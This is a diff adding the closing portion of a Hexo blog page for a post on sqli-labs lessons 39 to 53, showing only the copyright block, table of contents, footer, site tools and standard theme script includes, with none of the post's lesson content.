+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> [Sqli-Labs-Master] - Page_3</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-11-01 01:06:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-01 01:06:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/11/01/Security/Range/[Sqli-Labs-Master] - Page_3/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">[Sqli-Labs-Master] - Page_3</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqli-Labs-Page-3"><span class="nav-text">Sqli-Labs-Page_3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-39"><span class="nav-text">Less-39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-40"><span class="nav-text">Less-40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-41"><span class="nav-text">Less-41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-42"><span class="nav-text">Less-42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-43"><span class="nav-text">Less-43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-44"><span class="nav-text">Less-44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-45"><span class="nav-text">Less-45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-46"><span class="nav-text">Less-46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-47"><span class="nav-text">Less-47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-48"><span class="nav-text">Less-48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-49"><span class="nav-text">Less-49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-50"><span class="nav-text">Less-50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-51"><span class="nav-text">Less-51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-52"><span class="nav-text">Less-52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-53"><span class="nav-text">Less-53</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
